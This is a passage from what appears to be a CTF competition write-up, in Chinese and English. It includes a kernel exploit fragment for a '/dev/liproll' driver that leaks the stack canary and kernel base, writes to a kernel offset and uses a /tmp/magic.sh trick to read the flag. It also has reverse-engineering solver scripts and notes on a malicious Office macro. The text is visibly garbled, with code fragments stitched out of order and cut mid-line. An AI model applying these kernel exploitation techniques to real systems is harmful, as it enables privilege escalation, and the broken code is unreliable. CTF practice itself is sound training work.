    ioctl(fd,0xD3C7F01,arg);
}
void info(){
     for(int i=0;i /tmp/magic.sh
echo -ne '\xff\xff\xff\xff' > /tmp/123
chmod +x /tmp/magic.sh
chmod +x /tmp/123
/tmp/123
cat /tmp/flag
Reverse
jumpjump
    fd=open("/dev/liproll",0);
    create(fd);
    choose(fd,0);
    read(fd,data,0x200);
    size_t canary=data[32];
    size_t kernel=data[52]-0x20007c;
    info();
    printf("[+]Leaked: %llx %llx\n",canary,kernel);
    magic_write(fd,kernel+0x1448460);
    //printf("[+]Leaked: %llx\n",cc_off);  
}
x=[0x00000009, 0x0000000B, 0x00000006, 0x0000005A, 0x0000005B, 0x0000000A, 
0x00000054, 0x00000005, 
    0x0000004D, 0x00000057, 0x00000056, 0x00000054, 0x0000000B, 0x0000004D, 
0x00000054, 0x00000009, 
    0x00000055, 0x00000040, 0x0000004D, 0x00000009, 0x00000006, 0x00000059, 
0x0000000B, 0x0000004D, 
    0x00000055, 0x00000054, 0x00000058, 0x00000057, 0x0000005B, 0x00000009, 
0x0000000B, 0x00000040, 
    0x00000005, 0x0000000A, 0x00000005, 0x00000009]
for i in x:
    print(chr(((i ^ 0x33) - 4) ^ 0x57), end='')
#acf23b4e-764c-4a58-af1c-54073ac8ebea
baby_spear
通过OfficeMal获得宏脚本，先尝试⿊盒。Procmon发现宏试图读$TEMP\lsc.key⽂件来解密，对应宏代
码如下:
解密可得ID0ntWantT0SetTheWor1dOnFIRE。不过Parapluie.exe并没有释放，尝试对
advapi32!CryptDecrypt下断，可以提出内存中的PE:
根据提示爆破seed，AES解密得到flag
No Name
修改删除DEX的部分,重新打包拿到解密后的DEX
white give
把那⼀堆常数的类型设置成const可以⾃动优化⼀些东⻄
先把输⼊每4个⼀组做sha256存到buf数组⾥
然后256个字节为⼀组去⼀个运算，先sbox，之后跑了⼀个表做亦或，倒回来即可
rnd_table = '''26 27 F6 85 97 15 AD 1D D2 94 DD C4 76 19 39 31
F1 AD B5 58 F0 93 97 32 19 2B D1 C0 FD 16 8E 4E
48 9B 0B F5 3B 49 A8 63 5D DE 3F DF 6D 68 B4 87
9A AA CD DC F7 C1 44 81 29 08 1B 40 62 38 30 4E
94 D4 11 D0 DE C4 11 9D 4B 3F 9C 46 BB EF C7 54
21 50 2B D0 EF 5A F4 09 CF 5F 35 91 94 36 7F 89
70 99 B1 1E 67 CC 11 54 03 7F 9C 03 4A F6 9B 1E
ED 67 77 3B C2 A4 CE 50 74 F9 C6 BB 7A 58 A2 86
45 B3 93 E8 BE AA D0 0F EF 66 E8 1C 00 C5 57 70
66 B7 58 26 57 E8 FB E0 81 9F 77 C7 FB E6 C1 CD
7C EB 5E 36 CB A6 75 56 76 BC 28 9C C7 A3 24 CF
F4 07 77 98 96 6D A3 41 5C 17 F0 BC 01 27 06 E7
7B 07 BA 0E 76 07 29 B1 00 48 03 88 86 DA 2A C5
FF 21 7C 99 67 7D EC F9 6F 29 D8 A2 73 64 97 5B
AC CF 51 7A A7 17 13 A9 F5 D3 22 EA 25 B0 90 D9
EF CB 0E 31 B2 5E 01 92 21 9F D8 82 38 E5 9C B1'''.replace(' 
','').replace('\\n','').decode('hex')
table = '''F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF
E0 E1 E2 E3 E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF
D0 D1 D2 D3 D4 D5 D6 D7 D8 D9 DA DB DC DD DE DF
C0 C1 C2 C3 C4 C5 C6 C7 C8 C9 CA CB CC CD CE CF
B0 B1 B2 B3 B4 B5 B6 B7 B8 B9 BA BB BC BD BE BF
A0 A1 A2 A3 A4 A5 A6 A7 A8 A9 AA AB AC AD AE AF
90 91 92 93 94 95 96 97 98 99 9A 9B 9C 9D 9E 9F
80 81 82 83 84 85 86 87 88 89 8A 8B 8C 8D 8E 8F
70 71 72 73 74 75 76 77 78 79 7A 7B 7C 7D 7E 7F
60 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F
50 51 52 53 54 55 56 57 58 59 5A 5B 5C 5D 5E 5F
40 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F
30 31 32 33 34 35 36 37 38 39 3A 3B 3C 3D 3E 3F
20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F
10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F
00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F'''.replace(' 
','').replace('\\n','').decode('hex')
enc_flag = '''2B 75 DD 89 55 4C 62 E2 F0 FC 2A 56 51 4D 41 44
1E 7C 88 17 92 BD A5 E6 F1 AD 27 E0 E0 19 FD 3F
C7 5A 87 D2 F9 77 D7 26 7C A6 CA BF 72 69 03 6B
DE 54 D0 DD E6 8A 2E DE 61 47 76 5C B2 66 B0 9B
77 BC E4 90 DC 57 9C 81 61 63 2D 6D DB 73 1A E3
7E B7 C2 96 68 4C AC 2E 1F 04 79 0B 37 E3 7E F6
2E 1D 91 F8 70 F5 7C DC 16 29 9A 14 D9 E8 E8 F0
B8 9B A7 D4 E3 87 A8 0D 36 8C 47 A4 37 67 7C 9F
18 B0 39 C3 F9 31 B6 2B C6 21 17 74 47 6A 87 DB
3A AB 1D FF 14 76 F2 5E 33 C4 CC AA FB A9 39 3F
FD D6 64 C6 41 5F B8 70 F3 00 0F 6D C6 63 FA C3
36 D3 44 12 E6 9A CC 36 B0 96 60 05 03 91 29 22
B7 1A D1 74 B9 9C 6F A9 1E 39 90 1D D8 D1 29 83
FA 65 D9 73 1B 69 1E DD E1 71 11 A6 B1 D4 44 7E
7D C4 D9 97 F1 45 A3 34 96 D8 64 60 51 86 13 E6
79 90 7C 22 49 9A 33 C8 6D 9C 1F C4 69 10 B0 15
FC 9A C8 AC 2A DD 84 E4 E5 89 0F 8B 69 0E 3A FE
E0 E6 98 36 65 42 F2 66 40 43 BE 26 8F 15 58 7A
21 EE EB F0 9D F7 33 4D AA 3B 63 A6 0D B8 3A 4E
11 80 36 3F D0 B4 5E BA BB 92 57 F5 7B 33 F9 66
BB D2 CE C8 19 8B 1D 67 39 AB FF 3D EA 3F E6 15
FB A9 46 4F FF F7 00 F5 1F B6 5F CE 32 2E 28 D2
F1 21 7E 7A A3 0C DE 2E BD 1C 88 9E 7F 12 CD 59
9D 45 13 45 19 75 0F 6B BA 74 20 74 18 A0 89 D3
01 63 E6 11 34 04 68 5A 6A B7 B2 36 6E 16 6E A0
06 52 EC 7C 0F C0 3D 37 CF DF 80 74 69 20 5D BE
8C AB 5E 11 1A 44 4A E0 6A AF 3B 04 7D 79 09 E5
46 0E EE 9D 36 A8 B1 39 B0 F0 5F 02 60 63 BB FB
C4 BB 01 F4 8A DE 3C 06 90 1F 8C 47 C4 04 8E 9D
BF AD 95 84 68 89 9A 4F F4 6B 52 73 0D EC 99 83
61 2F B3 1B 8F D8 84 1F 91 A6 BF BE 63 A0 EE 16
D5 70 73 FC D9 4E 8E E0 92 EF 4A EB EB CB 7E A7'''.replace(' 
','').replace('\\n','').decode('hex')
def inv_sbox(i):
    return table.index(chr(i))
dec = ''
for m in xrange(2):
    ori = enc_flag[m*256:m * 256+256]
    Buf1  = [0] * 256
    for i in xrange(256):
        Buf1[i] = ord(ori[i])
    for n in xrange(15,-1,-1):
        t_table = [0] * 256
        for jj in xrange(1,17):
            for kk in range(16):
                t_table[(jj-1) * 16 + kk] = (jj * 
ord(rnd_table[kk+16*n])%0x100)
        for ll in xrange(256):
            Buf1[ll] -= ll
            Buf1[ll] %= 0x100
            Buf1[ll] ^= t_table[ll]
        # print(Buf1)
Ancient
init_array
很多奇怪的字符串解密
Flag⻓度56
第⼀个check d3ctf
Flag和那个字符串进⾏了⼀通变换
        fuck = []
        for ii in xrange(256):
            # Buf1[ii + m * 256] = tables[[ii + m * 256]]
            Buf1[ii] = inv_sbox(Buf1[ii])
        # for fff in Buf1:
        #     fuck.append(hex(fff))
        # print(fuck)
    for i in Buf1:
        dec += chr(i)
import string 
from hashlib import sha256
print(dec.encode('hex'))
des_list = []
find_list = []
for i in xrange(0,512,32):
    des_list.append(dec[i:i+32])
    find_list.append('')
for i in string.printable:
    for j in string.printable:
        for l in string.printable:
            for k in string.printable:
                ts = i+j+l+k
                t = sha256(ts).digest()
                for ttt in des_list:
                    if t == ttt:
                        index = des_list.index(ttt)
                        find_list[index] = ts
                        print(index,ts)
                        break
res = ''
for i in find_list:
    res += i
print(res)
unsigned char ida_chars[] =
{
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
  0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 